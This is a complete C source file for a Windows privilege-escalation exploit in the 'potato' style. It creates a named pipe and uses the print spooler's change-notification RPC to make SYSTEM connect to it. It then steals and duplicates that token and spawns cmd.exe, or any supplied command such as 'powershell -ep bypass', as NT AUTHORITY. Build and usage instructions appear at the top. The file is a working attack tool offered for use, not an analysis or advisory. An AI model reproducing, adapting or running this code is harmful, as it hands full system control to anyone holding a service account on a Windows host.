/*
 * privesc is like potato
 *
 * requires seimpersonateprivilege to be enabled, check with whoami /priv
 * uses print spooler (heh printspooler)
 *
 * build (replace "x86_64-w64-mingw32-gcc" with "gcc" if you're building on windows):
 *   x86_64-w64-mingw32-gcc -O2 -D_M_AMD64 -o privesc.exe privesc.c ms-rprn_c.c -ladvapi32 -lrpcrt4 -static
 *
 * usage:
 *   privesc.exe spawns cmd.exe as nt authority
 *	 privesc.exe "cmd /c" spawns cmd.exe as nt authority and runs a command
 *   privesc.exe "powershell -ep bypass" spawns powershell as nt authority
 */

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <winspool.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ms-rprn_h.h"

void __RPC_FAR * __RPC_USER MIDL_user_allocate(size_t cb)
{
    return malloc(cb);
}

void __RPC_USER MIDL_user_free(void __RPC_FAR * pv)
{
    free(pv);
}


#define PIPE_BASENAME      L"test" // change if fucked
#define PIPE_FULLNAME      L"\\\\.\\pipe\\test\\pipe\\spoolss"
#define TIMEOUT_MS         10000

#ifndef PRINTER_CHANGE_ADD_JOB
#define PRINTER_CHANGE_ADD_JOB 0x00000100
#endif

static HANDLE g_hSystemToken = NULL;

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
    RPC_STATUS status;
    RPC_WSTR szStringBinding = NULL;
    handle_t hBinding = NULL;

    if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB",
                                 (RPC_WSTR)L"ncacn_np",
                                 (RPC_WSTR)lpStr,
                                 (RPC_WSTR)L"\\pipe\\spoolss",
                                 NULL, &szStringBinding) != RPC_S_OK)
        return NULL;

    status = RpcBindingFromStringBindingW(szStringBinding, &hBinding);
    RpcStringFreeW(&szStringBinding);
    return (status == RPC_S_OK) ? hBinding : NULL;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t hBinding)
{
    RpcBindingFree(&hBinding);
}

void __RPC_USER PRINTER_HANDLE_rundown(PRINTER_HANDLE hPrinter)
{
    (void)hPrinter;
}

static BOOL EnablePrivilege(LPCWSTR wPriv)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid;
    BOOL bOk = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (LookupPrivilegeValueW(NULL, wPriv, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
            bOk = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    }
    CloseHandle(hToken);
    return bOk;
}

static DWORD WINAPI PipeServerThread(LPVOID lpParam)
{
    HANDLE hPipe = (HANDLE)lpParam;

    while (g_hSystemToken == NULL) {
        if (!ConnectNamedPipe(hPipe, NULL)) {
            DWORD err = GetLastError();
            if (err == ERROR_NO_DATA) {
                DisconnectNamedPipe(hPipe);
                continue;
            }
            if (err != ERROR_PIPE_CONNECTED)
                break;
        }
        wprintf(L"pipe client (heh, pipe client) connected, impersonating...\n");

        if (!ImpersonateNamedPipeClient(hPipe)) {
            wprintf(L"impersonatenamedpipeclient failed: %lu\n", GetLastError());
            DisconnectNamedPipe(hPipe);
            continue;
        }

        HANDLE hThreadToken = NULL, hPrimary = NULL;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hThreadToken)) {
            if (DuplicateTokenEx(hThreadToken, TOKEN_ALL_ACCESS, NULL,
                                 SecurityImpersonation, TokenPrimary, &hPrimary)) {
                if (InterlockedCompareExchangePointer(&g_hSystemToken, hPrimary, NULL) != NULL)
                    CloseHandle(hPrimary);
                else
                    wprintf(L"pot of greed stole nt authority token!\n");
            } else {
                wprintf(L"duplicatetokenex failed: %lu\n", GetLastError());
            }
            CloseHandle(hThreadToken);
        } else {
            wprintf(L"openthreadtoken failed: %lu\n", GetLastError());
        }
        RevertToSelf();
        DisconnectNamedPipe(hPipe);
    }
    return 0;
}

static void TriggerNamedPipeConnection(void)
{
    wchar_t wszComputer[64] = { 0 };
    wchar_t wszTarget[128] = { 0 };
    wchar_t wszCapture[128] = { 0 };
    DWORD dwLen = 64;
    HANDLE hPrinter = NULL;
    DEVMODE_CONTAINER dmc = { 0 };
    DWORD dwStatus;

    GetComputerNameW(wszComputer, &dwLen);
    swprintf(wszTarget, 128, L"\\\\%ls", wszComputer);
    swprintf(wszCapture, 128, L"\\\\%ls/pipe/%ls", wszComputer, PIPE_BASENAME);

    wprintf(L"opening spooler on %ls ...\n", wszTarget);
    dwStatus = RpcOpenPrinter(wszTarget, &hPrinter, NULL, &dmc, 0);
    if (dwStatus != 0) {
        wprintf(L"rpcopenprinter failed: 0x%lx\n", dwStatus);
        return;
    }

    wprintf(L"sending change notification request to %ls ...\n", wszCapture);
    RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB,
                                                  0, wszCapture, 0, NULL);
    RpcClosePrinter(&hPrinter);
}

static BOOL SpawnAsSystem(LPCWSTR wCmd)
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    DWORD dwFlags = CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
    BOOL bOk;

    si.cb = sizeof(si);
    si.lpDesktop = L"WinSta0\\Default";

    bOk = CreateProcessAsUserW(g_hSystemToken, NULL, (LPWSTR)wCmd, NULL, NULL,
                               FALSE, dwFlags, NULL, NULL, &si, &pi);
    if (!bOk && GetLastError() == ERROR_PRIVILEGE_NOT_HELD) {
        wprintf(L"createprocessasuser denied, retrying with createprocesswithtokenw...\n");
        bOk = CreateProcessWithTokenW(g_hSystemToken, 0, NULL, (LPWSTR)wCmd,
                                      dwFlags, NULL, NULL, &si, &pi);
    }
    if (bOk) {
        wprintf(L"spawned pid %lu as nt authority: %ls\n", pi.dwProcessId, wCmd);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TRUE;
    }
    wprintf(L"process creation failed: %lu\n", GetLastError());
    return FALSE;
}

int main(void)
{
    wchar_t wCmd[1024];
    int argc = 0;
    wchar_t **argv = NULL;
    HANDLE hPipe = NULL, hThread = NULL;
    SECURITY_ATTRIBUTES sa = { 0 };
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD dwStart;

    wprintf(L"privesc\n");

    if (!EnablePrivilege(SE_IMPERSONATE_NAME)) {
        wprintf(L"seimpersonateprivilege NOT present in this token, you're probably crippled by windy bindy\n");
        wprintf(L"check with whoami /priv\n");
        return 1;
    }
    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    wprintf(L"seimpersonateprivilege confirmed\n");

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1 && argv) {
        wchar_t *p = wCmd;
        size_t left = 1024;
        for (int i = 1; i < argc && left > 0; i++) {
            size_t len = wcslen(argv[i]);
            if (i > 1) { *p++ = L' '; left--; }
            if (len >= left) len = left - 1;
            memcpy(p, argv[i], len * sizeof(wchar_t));
            p += len; left -= len;
        }
        *p = L'\0';
    } else {
        wcscpy(wCmd, L"cmd.exe");
    }
    if (argv) LocalFree(argv);

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &pSD, NULL)) {
        wprintf(L"sddl conversion failed: %lu\n", GetLastError());
        return 1;
    }
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = pSD;

    hPipe = CreateNamedPipeW(PIPE_FULLNAME, PIPE_ACCESS_DUPLEX,
                             PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                             10, 4096, 4096, 0, &sa);
    LocalFree(pSD);
    if (hPipe == INVALID_HANDLE_VALUE) {
        wprintf(L"createnamedpipe failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"pipe ready (heh, pipe ready): %ls\n", PIPE_FULLNAME);

    hThread = CreateThread(NULL, 0, PipeServerThread, hPipe, 0, NULL);
    if (!hThread) {
        wprintf(L"createthread failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    TriggerNamedPipeConnection();

    dwStart = GetTickCount();
    while (g_hSystemToken == NULL && (GetTickCount() - dwStart) < TIMEOUT_MS)
        Sleep(250);

    if (g_hSystemToken == NULL) {
        wprintf(L"no nt authority connection within %u s.\n", TIMEOUT_MS / 1000);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        CloseHandle(hPipe);
        return 1;
    }

    wprintf(L"launching: %ls\n", wCmd);
    if (!SpawnAsSystem(wCmd)) {
        CloseHandle(g_hSystemToken);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        CloseHandle(hPipe);
        return 1;
    }

    wprintf(L"verify inside the spawned process with whoami, should be expect nt authority\n");
    CloseHandle(g_hSystemToken);
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    CloseHandle(hPipe);
    return 0;
}